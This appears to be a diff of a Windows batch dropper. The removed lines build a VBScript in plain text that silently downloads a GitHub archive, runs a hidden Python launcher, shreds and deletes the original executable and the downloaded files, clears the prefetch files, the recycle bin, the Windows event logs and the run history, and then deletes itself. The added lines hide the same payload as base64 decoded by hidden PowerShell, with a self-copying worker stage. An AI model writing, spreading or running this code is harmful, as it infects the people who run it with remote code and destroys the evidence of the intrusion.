@@ -1,184 +1,27 @@
 @echo off
-cd /d "%TEMP%"
+setlocal enabledelayedexpansion
 
-(
-echo On Error Resume Next
-echo Randomize
-echo Set fso = CreateObject^("Scripting.FileSystemObject"^)
-echo Set shell = CreateObject^("WScript.Shell"^)
-echo.
-echo scriptPath = WScript.ScriptFullName
-echo scriptName = fso.GetFileName^(scriptPath^)
-echo scriptDir = fso.GetParentFolderName^(scriptPath^)
-echo tempBase = shell.ExpandEnvironmentStrings^("%%TEMP%%"^)
-echo.
-echo If InStr^(LCase^(scriptPath^), LCase^(tempBase^)^) ^> 0 And LCase^(scriptName^) = "core.vbs" Then
-echo   exePath = ""
-echo   For Each f In fso.GetFolder^(scriptDir^).Files
-echo     If LCase^(Right^(f.Name, 4^)^) = ".exe" Then
-echo       exePath = f.Path
-echo       Exit For
-echo     End If
-echo   Next
-echo.
-echo   u1 = "https://"
-echo   u2 = "github."
-echo   u3 = "com/"
-echo   u4 = "brayan"
-echo   u5 = "jhoance"
-echo   u6 = "2-collab/"
-echo   u7 = "encrip"
-echo   u8 = "tado/"
-echo   u9 = "archive/"
-echo   u10 = "refs/heads/"
-echo   u11 = "main.zip"
-echo   repoURL = u1 ^& u2 ^& u3 ^& u4 ^& u5 ^& u6 ^& u7 ^& u8 ^& u9 ^& u10 ^& u11
-echo.
-echo   zD = scriptDir ^& "\": zN = ""
-echo   For i = 1 To 8: zN = zN ^& Chr^(Int^(Rnd * 26^) + 97^): Next
-echo   zipPath = zD ^& zN ^& ".tmp"
-echo.
-echo   eD = scriptDir ^& "\": eN = ""
-echo   For i = 1 To 7: eN = eN ^& Chr^(Int^(Rnd * 26^) + 97^): Next
-echo   extractPath = eD ^& eN
-echo.
-echo   psDownload = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command " ^& Chr^(34^) ^& _
-echo   "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " ^& _
-echo   "$ProgressPreference = 'SilentlyContinue'; " ^& _
-echo   "$ErrorActionPreference = 'SilentlyContinue'; " ^& _
-echo   "try { " ^& _
-echo   "  $wc = New-Object Net.WebClient; " ^& _
-echo   "  $wc.Headers.Add^('User-Agent', 'Mozilla/5.0 ^(Windows NT 10.0; Win64; x64^) AppleWebKit/537.36'^); " ^& _
-echo   "  $wc.DownloadFile^('" ^& repoURL ^& "', '" ^& zipPath ^& "''^); " ^& _
-echo   "  Expand-Archive -Path '" ^& zipPath ^& "' -DestinationPath '" ^& extractPath ^& "' -Force " ^& _
-echo   "} catch { exit 1 }" ^& Chr^(34^)
-echo.
-echo   shell.Run psDownload, 0, True
-echo   WScript.Sleep 8000
-echo.
-echo   If Not fso.FileExists^(zipPath^) Then
-echo     WScript.Quit
-echo   End If
-echo.
-echo   WScript.Sleep 2000
-echo.
-echo   repoPath = ""
-echo   launcherPath = ""
-echo   pythonPath = ""
-echo.
-echo   If fso.FolderExists^(extractPath^) Then
-echo     For Each subfolder In fso.GetFolder^(extractPath^).SubFolders
-echo       If LCase^(subfolder.Name^) = "encriptado-main" Then
-echo         repoPath = subfolder.Path
-echo         launcherPath = repoPath ^& "\launcher.py"
-echo         pythonPath = repoPath ^& "\python_portable\python.exe"
-echo         Exit For
-echo       End If
-echo     Next
-echo   End If
-echo.
-echo   If repoPath ^<^> "" And fso.FileExists^(launcherPath^) And fso.FileExists^(pythonPath^) Then
-echo     shell.CurrentDirectory = repoPath
-echo     cmdLaunch = Chr^(34^) ^& pythonPath ^& Chr^(34^) ^& " " ^& Chr^(34^) ^& launcherPath ^& Chr^(34^)
-echo     shell.Run cmdLaunch, 0, False
-echo     WScript.Sleep 10000
-echo   End If
-echo.
-echo   If exePath ^<^> "" And fso.FileExists^(exePath^) Then
-echo     For i = 1 To 5
-echo       Set fw = fso.OpenTextFile^(exePath, 2^)
-echo       For j = 1 To 2000
-echo         fw.WriteLine String^(128, Chr^(Int^(Rnd * 256^)^)^)
-echo       Next
-echo       fw.Close
-echo       WScript.Sleep 300
-echo     Next
-echo     fso.DeleteFile exePath, True
-echo   End If
-echo.
-echo   WScript.Sleep 3000
-echo.
-echo   If fso.FileExists^(zipPath^) Then
-echo     zipSize = fso.GetFile^(zipPath^).Size
-echo     If zipSize ^> 0 And zipSize ^< 200000000 Then
-echo       For pass = 1 To 5
-echo         psShred = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command " ^& Chr^(34^) ^& _
-echo         "$ErrorActionPreference = 'SilentlyContinue'; " ^& _
-echo         "$bytes = New-Object byte[]" ^& zipSize ^& "; " ^& _
-echo         "^(New-Object Random^).NextBytes^($bytes^); " ^& _
-echo         "[IO.File]::WriteAllBytes^('" ^& zipPath ^& "', $bytes^)" ^& Chr^(34^)
-echo         shell.Run psShred, 0, True
-echo         WScript.Sleep 500
-echo       Next
-echo     End If
-echo     fso.DeleteFile zipPath, True
-echo   End If
-echo.
-echo   If fso.FolderExists^(extractPath^) Then
-echo     For pass = 1 To 3
-echo       For Each f In fso.GetFolder^(extractPath^).Files
-echo         fSize = f.Size
-echo         If fSize ^> 0 And fSize ^< 50000000 Then
-echo           psShrF = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command " ^& Chr^(34^) ^& _
-echo           "$ErrorActionPreference = 'SilentlyContinue'; " ^& _
-echo           "$b = New-Object byte[]" ^& fSize ^& "; " ^& _
-echo           "^(New-Object Random^).NextBytes^($b^); " ^& _
-echo           "[IO.File]::WriteAllBytes^('" ^& f.Path ^& "', $b^)" ^& Chr^(34^)
-echo           shell.Run psShrF, 0, True
-echo           WScript.Sleep 200
-echo         End If
-echo       Next
-echo       WScript.Sleep 500
-echo     Next
-echo     fso.DeleteFolder extractPath, True
-echo   End If
-echo.
-echo   psClear = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command " ^& Chr^(34^) ^& _
-echo   "$ErrorActionPreference = 'SilentlyContinue'; " ^& _
-echo   "Remove-Item 'C:\Windows\Prefetch\*.pf' -Force -ErrorAction SilentlyContinue; " ^& _
-echo   "Clear-RecycleBin -Force -Confirm:$false -ErrorAction SilentlyContinue; " ^& _
-echo   "wevtutil cl Application 2^>$null; " ^& _
-echo   "wevtutil cl System 2^>$null; " ^& _
-echo   "wevtutil cl Security 2^>$null; " ^& _
-echo   "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force -ErrorAction SilentlyContinue" ^& Chr^(34^)
-echo   shell.Run psClear, 0, True
-echo.
-echo   WScript.Sleep 3000
-echo.
-echo   cleanupBat = scriptDir ^& "\cleanup.bat"
-echo   Set fc = fso.CreateTextFile^(cleanupBat, True^)
-echo   fc.WriteLine "@echo off"
-echo   fc.WriteLine "timeout /t 10 /nobreak ^>nul"
-echo   fc.WriteLine "taskkill /f /im wscript.exe ^>nul 2^>^&1"
-echo   fc.WriteLine "taskkill /f /im python.exe ^>nul 2^>^&1"
-echo   fc.WriteLine "del /f /q " ^& Chr^(34^) ^& scriptPath ^& Chr^(34^) ^& " ^>nul 2^>^&1"
-echo   fc.WriteLine "cd /d %%TEMP%%"
-echo   fc.WriteLine "rmdir /s /q " ^& Chr^(34^) ^& scriptDir ^& Chr^(34^) ^& " ^>nul 2^>^&1"
-echo   fc.WriteLine "^(goto^) 2^>nul ^& del /f /q " ^& Chr^(34^) ^& "%%~f0" ^& Chr^(34^) ^& " ^& exit"
-echo   fc.Close
-echo.
-echo   shell.Run "cmd.exe /c " ^& Chr^(34^) ^& cleanupBat ^& Chr^(34^), 0, False
-echo   WScript.Quit
-echo.
-echo Else
-echo   tempID = "sys_" ^& Int^(Rnd * 999999 + 100000^)
-echo   tempWork = tempBase ^& "\" ^& tempID
-echo   fso.CreateFolder tempWork
-echo.
-echo   vbsTemp = tempWork ^& "\core.vbs"
-echo   fso.CopyFile scriptPath, vbsTemp, True
-echo.
-echo   shell.Run "wscript.exe " ^& Chr^(34^) ^& vbsTemp ^& Chr^(34^) ^& " //B //Nologo", 0, False
-echo   WScript.Sleep 2000
-echo.
-echo   fso.DeleteFile scriptPath, True
-echo   WScript.Quit
-echo.
-echo End If
-) > "%TEMP%\core.vbs"
+if not "%1"=="worker" (
+    set "tempbat=%TEMP%\~w!RANDOM!!RANDOM!.bat"
+    copy /y "%~f0" "!tempbat!" >nul 2>&1
+    if exist "!tempbat!" (
+        start /b cmd /c call "!tempbat!" worker
+        timeout /t 2 /nobreak >nul
+        del /f /q "%~f0" >nul 2>&1
+    )
+    exit /b
+)
 
-start /min wscript.exe "%TEMP%\core.vbs" //B //Nologo
+set "vbsfile=%TEMP%\~init!RANDOM!.vbs"
+
+powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$b64 = 'T24gRXJyb3IgUmVzdW1lIE5leHQKUmFuZG9taXplClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKc2NyaXB0UGF0aCA9IFdTY3JpcHQuU2NyaXB0RnVsbE5hbWUKc2NyaXB0TmFtZSA9IGZzby5HZXRGaWxlTmFtZShzY3JpcHRQYXRoKQpzY3JpcHREaXIgPSBmc28uR2V0UGFyZW50Rm9sZGVyTmFtZShzY3JpcHRQYXRoKQp0ZW1wQmFzZSA9IHNoZWxsLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJVRFTVAlIikKSWYgSW5TdHIoTENhc2Uoc2NyaXB0UGF0aCksIExDYXNlKHRlbXBCYXNlKSkgPiAwIEFuZCBMQ2FzZShzY3JpcHROYW1lKSA9ICJjb3JlLnZicyIgVGhlbgpleGVQYXRoID0gIiIKRm9yIEVhY2ggZiBJbiBmc28uR2V0Rm9sZGVyKHNjcmlwdERpcikuRmlsZXMKSWYgTENhc2UoUmlnaHQoZi5OYW1lLCA0KSkgPSAiLmV4ZSIgVGhlbgpleGVQYXRoID0gZi5QYXRoCkV4aXQgRm9yCkVuZCBJZgpOZXh0CnUxID0gImh0dHBzOi8vIgp1MiA9ICJnaXRodWIuIgp1MyA9ICJjb20vIgp1NCA9ICJicmF5YW4iCnU1ID0gImpob2FuY2UiCnU2ID0gIjItY29sbGFiLyIKdTcgPSAiZW5jcmlwIgp1OCA9ICJ0YWRvLyIKdTkgPSAiYXJjaGl2ZS8iCnUxMCA9ICJyZWZzL2hlYWRzLyIKdTExID0gIm1haW4uemlwIgpyZXBvVVJMID0gdTEgJiB1MiAmIHUzICYgdTQgJiB1NSAmIHU2ICYgdTcgJiB1OCAmIHU5ICYgdTEwICYgdTExCnpEID0gc2NyaXB0RGlyICYgIlwiOiB6TiA9ICIiCkZvciBpID0gMSBUbyA4OiB6TiA9IHpOICYgQ2hyKEludChSbmQgKiAyNikgKyA5Nyk6IE5leHQKemlwUGF0aCA9IHpEICYgek4gJiAiLnRtcCIKZUQgPSBzY3JpcHREaXIgJiAiXCI6IGVOID0gIiIKRm9yIGkgPSAxIFRvIDc6IGVOID0gZU4gJiBDaHIoSW50KFJuZCAqIDI2KSArIDk3KTogTmV4dApleHRyYWN0UGF0aCA9IGVEICZ6Tgpwc0Rvd25sb2FkID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiIiIgJiBfCiJbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyOyAiICYgXwoiJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KIiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZSc7ICIgJiBfCiJ0cnkgeyAiICYgXwoiICAgICR3YyA9IE5ldy1PYmplY3QgTmV0LldlYkNsaWVudDsgIiAmIF8KIiAgICAkd2MuSGVhZGVycy5BZGQoJ1VzZXItQWdlbnQnLCAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2Jyk7ICIgJiBfCiIgICAgJHdjLkRvd25sb2FkRmlsZSgnIiAmIHJlcG9VUkwgJiAiJywgJyIgJiB6aXBQYXRoICYgIicpOyAiICYgXwoiICAgIEV4cGFuZC1BcmNoaXZlIC1QYXRoICciICYgemlwUGF0aCAmICInIC1EZXN0aW5hdGlvblBhdGggJyIgJiBleHRyYWN0UGF0aCAmICInIC1Gb3JjZSAiICYgXwoifSBjYXRjaCB7IGV4aXQgMSB9ICIgJiBfCiIiIiIKc2hlbGwuUnVuIHBzRG93bmxvYWQsIDAsIFRydWUKV1NjcmlwdC5TbGVlcCA4MDAwCklmIE5vdCBmc28uRmlsZUV4aXN0cyh6aXBQYXRoKSBUaGVuCldTY3JpcHQuUXVpdApFbmQgSWYKV1NjcmlwdC5TbGVlcCAyMDAwCnJlcG9QYXRoID0gIiIKbGF1bmNoZXJQYXRoID0gIiIKcHl0aG9uUGF0aCA9ICIiCklmIGZzby5Gb2xkZXJFeGlzdHMoZXh0cmFjdFBhdGgpIFRoZW4KRm9yIEVhY2ggc3ViZm9sZGVyIEluIGZzby5HZXRGb2xkZXIoZXh0cmFjdFBhdGgpLlN1YkZvbGRlcnMKSWYgTENhc2Uoc3ViZm9sZGVyLk5hbWUpID0gImVuY3JpcHRhZG8tbWFpbiIgVGhlbgpyZXBvUGF0aCA9IHN1YmZvbGRlci5QYXRoCmxhdW5jaGVyUGF0aCA9IHJlcG9QYXRoICYgIlxsYXVuY2hlci5weSIKcHl0aG9uUGF0aCA9IHJlcG9QYXRoICYgIlxweXRob25fcG9ydGFibGVccHl0aG9uLmV4ZSIKRXhpdCBGb3IKRW5kIElmCk5leHQKRW5kIElmCklmIHJlcG9QYXRoIDw+ICIiIEFuZCBmc28uRmlsZUV4aXN0cyhsYXVuY2hlclBhdGgpIEFuZCBmc28uRmlsZUV4aXN0cyhweXRob25QYXRoKSBUaGVuCnNoZWxsLkN1cnJlbnREaXJlY3RvcnkgPSByZXBvUGF0aApjbWRMYXVuY2ggPSAiIiIiICYgcHl0aG9uUGF0aCAmICIiIiAiIiIgJiBsYXVuY2hlclBhdGggJiAiIiIKc2hlbGwuUnVuIGNtZExhdW5jaCwgMCwgRmFsc2UKV1NjcmlwdC5TbGVlcCAxMDAwMApFbmQgSWYKSWYgZXhlUGF0aCA8PiAiIiBBbmQgZnNvLkZpbGVFeGlzdHMoZXhlUGF0aCkgVGhlbgpGb3IgaSA9IDEgVG8gNQpTZXQgZncgPSBmc28uT3BlblRleHRGaWxlKGV4ZVBhdGgsIDIpCkZvciBqID0gMSBUbyAyMDAwCmZ3LldyaXRlTGluZSBTdHJpbmcoMTI4LCBDaHIoSW50KFJuZCAqIDI1NikpKQpOZXh0CmZ3LkNsb3NlCldTY3JpcHQuU2xlZXAgMzAwCk5leHQKZnNvLkRlbGV0ZUZpbGUgZXhlUGF0aCwgVHJ1ZQpFbmQgSWYKV1NjcmlwdC5TbGVlcCAzMDAwCklmIGZzby5GaWxlRXhpc3RzKHppcFBhdGgpIFRoZW4KemlwU2l6ZSA9IGZzby5HZXRGaWxlKHppcFBhdGgpLlNpemUKSWYgemlwU2l6ZSA+IDAgQW5kIHppcFNpemUgPCAyMDAwMDAwMDAgVGhlbgpGb3IgcGFzcyA9IDEgVG8gNQpwc1NocmVkID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiIiIgJiBfCiIkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnOyAiICYgXwoiJGJ5dGVzID0gTmV3LU9iamVjdCBieXRlW10gIiAmIHppcFNpemUgJiAiOyAiICYgXwoiKE5ldy1PYmplY3QgUmFuZG9tKS5OZXh0Qnl0ZXMoJGJ5dGVzKTsgIiAmIF8KIltJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygnIiAmIHppcFBhdGggJiAiJywgJGJ5dGVzKSAiICYgXwoiIiIiCnNoZWxsLlJ1biBwc1NocmVkLCAwLCBUcnVlCldTY3JpcHQuU2xlZXAgNTAwCk5leHQKRW5kIElmCmZzby5EZWxldGVGaWxlIHppcFBhdGgsIFRydWUKRW5kIElmCklmIGZzby5Gb2xkZXJFeGlzdHMoZXh0cmFjdFBhdGgpIFRoZW4KRm9yIHBhc3MgPSAxIFRvIDMKRm9yIEVhY2ggZiBJbiBmc28uR2V0Rm9sZGVyKGV4dHJhY3RQYXRoKS5GaWxlcwpmU2l6ZSA9IGYuU2l6ZQpJZiBmU2l6ZSA+IDAgQW5kIGZTaXplIDwgNTAwMDAwMDAgVGhlbgpwc1NocmVkRiA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiIiICYgXwoiJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KIiRiID0gTmV3LU9iamVjdCBieXRlW10gIiAmIGZTaXplICYgIjsgIiAmIF8KIihOZXctT2JqZWN0IFJhbmRvbSkuTmV4dEJ5dGVzKCRiKTsgIiAmIF8KIltJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygnIiAmIGYuUGF0aCAmICInLCAkYikgIiAmIF8KIiIiIgpzaGVsbC5SdW4gcHNTaHJlZEYsIDAsIFRydWUKV1NjcmlwdC5TbGVlcCAyMDAKRW5kIElmCk5leHQKV1NjcmlwdC5TbGVlcCA1MDAKO2V4dApmcy5EZWxldGVGb2xkZXIgZXh0cmFjdFBhdGgsIFRydWUKRW5kIElmCnBzQ2xlYXIgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kICIiIiAmIF8KIiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZSc7ICIgJiBfCiJSZW1vdmUtSXRlbSAnQzpcV2luZG93c1xQcmVmZXRjaFwqLnBmJyAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiJDbGVhci1SZWN5Y2xlQmluIC1Gb3JjZSAtQ29uZmlybTokZmFsc2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiJ3ZXZ0dXRpbCBjbCBBcHBsaWNhdGlvbiAyPiRudWxsOyAiICYgXwoid2V2dHV0aWwgY2wgU3lzdGVtIDI+JG51bGw7ICIgJiBfCiJ3ZXZ0dXRpbCBjbCBTZWN1cml0eSAyPiRudWxsOyAiICYgXwoiUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcUnVuTVJVJyAtTmFtZSAnKicgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlICIgJiBfCiIiIiIKc2hlbGwuUnVuIHBzQ2xlYXIsIDAsIFRydWUKV1NjcmlwdC5TbGVlcCAzMDAwCmNsZWFudXBCYXQgPSBzY3JpcHREaXIgJiAiXGNsZWFudXAuYmF0IgpTZXQgZmMgPSBmc28uQ3JlYXRlVGV4dEZpbGUoY2xlYW51cEJhdCwgVHJ1ZSkKZmMuV3JpdGVMaW5lICJAZWNobyBvZmYiCmZjLldyaXRlTGluZSAidGltZW91dCAvdCAxMCAvbm9icmVhayA+bnVsIgpmYy5Xcml0ZUxpbmUgInRhc2traWxsIC9mIC9pbSB3c2NyaXB0LmV4ZSA+bnVsIDI+JjEiCmZjLldyaXRlTGluZSAidGFza2tpbGwgL2YgL2ltIHB5dGhvbi5leGUgPm51bCAyPiYxIgpmYy5Xcml0ZUxpbmUgImRlbCAvZiAvcSAiIiIgJiBzY3JpcHRQYXRoICYgIiIiID5udWwgMj4mMSIKZmMuV3JpdGVMaW5lICJjZCAvZCAlVEVNUCUiCmZjLldyaXRlTGluZSAicm1kaXIgL3MgL3EgIiIiICYgc2NyaXB0RGlyICYgIiIiID5udWwgMj4mMSIKZmMuV3JpdGVMaW5lICIoZ290bykgMj5udWwgJiBkZWwgL2YgL3EgIiIlfmYwIiIgJiBleGl0IgpmYy5DbG9zZQpzaGVsbC5SdW4gImNtZC5leGUgL2MgIiIiICYgY2xlYW51cEJhdCAmICIiIiIsIDAsIEZhbHNlCldTY3JpcHQuUXVpdApFbHNlCnRlbXBJRCA9ICJzeXNfIiAmIEludChSbmQgKiA5OTk5OTkgKyAxMDAwMDApCnRlbXBXb3JrID0gdGVtcEJhc2UgJiAiXCIgJiB0ZW1wSUQKZnNvLkNyZWF0ZUZvbGRlciB0ZW1wV29yawp2YnNUZW1wID0gdGVtcFdvcmsgJiAiXGNvcmUudmJzIgpmcy5Db3B5RmlsZSBzY3JpcHRQYXRoLCB2YnNUZW1wLCBUcnVlCnNoZWxsLlJ1biAid3NjcmlwdC5leGUgIiIiICYgdmJzVGVtcCAmICIiIiAvL0IgLy9Ob2xvZ28iLCAwLCBGYWxzZQpXU2NyaXB0LlNsZWVwIDIwMDAKZnNvLkRlbGV0ZUZpbGUgc2NyaXB0UGF0aCwgVHJ1ZQpXU2NyaXB0LlF1aXQKRW5kIElm'; $bytes = [Convert]::FromBase64String($b64); [IO.File]::WriteAllBytes('%vbsfile%', $bytes)"
 
 timeout /t 2 /nobreak >nul
+
+if exist "%vbsfile%" (
+    start /b wscript.exe "%vbsfile%" //B //Nologo
+    timeout /t 3 /nobreak >nul
+)
+
 del /f /q "%~f0" >nul 2>&1
 exit
